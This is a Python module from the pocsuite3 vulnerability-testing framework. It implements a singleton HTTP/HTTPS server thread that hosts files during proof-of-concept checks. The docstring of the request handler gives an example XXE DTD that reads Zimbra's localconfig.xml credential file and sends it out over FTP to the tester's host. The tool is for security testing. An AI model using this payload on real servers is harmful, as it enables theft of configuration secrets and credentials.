#!usr/bin/env python
# -*- coding:utf-8 -*-
"""
@author: longofo
@file: __init__.py
@time: 2019/03/23
"""
import os
import random
import socket
import ssl
import threading
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
from pocsuite3.lib.utils import gen_cert
from pocsuite3.lib.core.common import check_port
from pocsuite3.lib.core.common import get_host_ip, get_host_ipv6
from pocsuite3.lib.core.data import logger, paths
from pocsuite3.lib.core.exception import PocsuiteSystemException


class PHTTPSingleton(type):
    '''
    HTTP server only allow one instance in pocsuite3
    '''
    _instance = None

    def __call__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super(PHTTPSingleton, cls).__call__(*args, **kwargs)
        return cls._instance


class BaseRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        """
        默认直接将当前目录结构映射到HTTP请求,即调用SimpleHTTPRequestHandler的do_GET方法

        可自定义响应信息,像下面这样:
        ```
        path = self.path
        status = 404
        count = 0

        xxe_dtd = '''<!ENTITY % d SYSTEM "file:///opt/zimbra/conf/localconfig.xml"><!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://{}:2121/%d;'>">'''.format(
            get_host_ip())
        if path == "/xxe_dtd":
            count = len(xxe_dtd)
            status = 200
            self.send_response(status)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', '{}'.format(count))
            self.end_headers()
            self.wfile.write(xxe_dtd.encode())
            return
        self.send_response(status)
        self.send_header('Content-Type', 'text/html')
        self.send_header("Content-Length", "{}".format(count))
        self.end_headers()
        ```
        """
        SimpleHTTPRequestHandler.do_GET(self)

    def do_HEAD(self):
        '''
        默认调用SimpleHTTPRequestHandler的do_HEAD方法

        可自定义响应信息,像下面这样:
        ```
        status = 404

        if self.path.endswith('jar'):
            status = 200
        self.send_response(status)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", "0")
        self.end_headers()
        ```
        '''
        SimpleHTTPRequestHandler.do_HEAD(self)


class HTTPServerV6(HTTPServer):
    address_family = socket.AF_INET6


class HTTPServerV4(HTTPServer):
    address_family = socket.AF_INET


class PHTTPServer(threading.Thread, metaclass=PHTTPSingleton):
    def __init__(self, bind_ip='0.0.0.0', bind_port=666, is_ipv6=False, use_https=False,
                 certfile=os.path.join(paths.POCSUITE_TMP_PATH, 'cacert.pem'),
                 requestHandler=BaseRequestHandler):
        threading.Thread.__init__(self)
        self.bind_ip = bind_ip
        self.bind_port = int(bind_port)
        self.is_ipv6 = is_ipv6
        self.https = use_https
        if self.https:
            self.scheme = 'https'
            gen_cert(filepath=certfile)
        else:
            self.scheme = 'http'
        self.certfile = certfile
        self.server_locked = False  # Avoid call start method muti-times
        self.server_started = False  # Aviod start server mutl-times
        self.requestHandler = requestHandler
        if ':' in bind_ip:
            ipv6 = get_host_ipv6()
            if not ipv6:
                logger.error('Your machine may not support ipv6')
                raise PocsuiteSystemException
            self.host_ip = ipv6
            self.httpserver = HTTPServerV6
            self.is_ipv6 = True
        else:
            self.is_ipv6 = False
            self.host_ip = get_host_ip()
            self.httpserver = HTTPServerV4

        self.__flag = threading.Event()  # The identifier used to pause the thread
        self.__flag.set()  # set flag True
        self.__running = threading.Event()  # The identifier used to stop the thread
        self.__running.set()  # set running True

    def start(self, daemon=True):
        # Http server can only allow start once in pocsuite3, avoid muti-threading start muti-times
        if self.server_locked:
            logger.info(
                'Httpd serve has been started on {}://{}:{}, '.format(self.scheme, self.bind_ip, self.bind_port))
            return

        if check_port(self.host_ip, self.bind_port):
            logger.error('Port {} has been occupied, start Httpd serve failed!'.format(self.bind_port))
            return

        self.server_locked = True
        self.setDaemon(daemon)
        threading.Thread.start(self)
        # Detect http server is started or not
        logger.info('Detect {} server is runing or not...'.format(self.scheme))
        detect_count = 10
        while detect_count:
            try:
                if check_port(self.host_ip, self.bind_port):
                    break
            except Exception as ex:
                logger.error(str(ex))
            time.sleep(random.random())
            detect_count -= 1

    def run(self):
        try:
            while self.__running.is_set():
                time.sleep(1)
                self.__flag.wait()
                if not self.server_started:
                    self.httpd = self.httpserver((self.bind_ip, self.bind_port), self.requestHandler)
                    logger.info("Starting httpd on {}://{}:{}".format(self.scheme, self.bind_ip, self.bind_port))
                    if self.https:
                        if self.certfile:
                            self.httpd.socket = ssl.wrap_socket(self.httpd.socket, certfile=self.certfile,
                                                                server_side=True)
                        else:
                            logger.error("You must provide certfile to use https")
                            break
                    thread = threading.Thread(target=self.httpd.serve_forever)
                    thread.setDaemon(True)
                    thread.start()
                    self.server_started = True
                    self.__flag.clear()
            self.httpd.shutdown()
            self.httpd.server_close()
            logger.info('Stop httpd server on {}://{}:{}'.format(self.scheme, self.bind_ip, self.bind_port))
        except Exception as ex:
            self.httpd.shutdown()
            self.httpd.server_close()
            logger.error(str(ex))

    def pause(self):
        self.__flag.clear()  # Set to False, let the thread block

    def resume(self):
        self.__flag.set()  # Set to True to stop the thread from blocking

    def stop(self):
        self.__flag.set()  # Restore the thread from the paused state, if it has been paused
        self.__running.clear()  # Set to False, stop threading

        time.sleep(random.randint(1, 3))
